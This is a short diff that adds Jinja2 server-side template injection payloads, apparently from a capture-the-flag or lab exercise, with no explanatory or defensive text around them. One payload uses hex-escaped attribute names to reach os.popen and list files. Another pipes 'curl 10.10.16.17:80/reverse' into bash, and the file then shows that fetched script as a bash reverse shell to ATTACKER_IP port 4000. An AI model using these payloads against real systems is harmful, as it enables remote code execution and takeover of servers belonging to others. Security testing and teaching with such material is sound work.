@@ -1,0 +1,7 @@
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("ls")|attr("read")()}}
+
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.16.17:80/reverse | bash")|attr("read")()}}
+
+reverse is a file on attaker machine containe: 
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4000 0>&1"
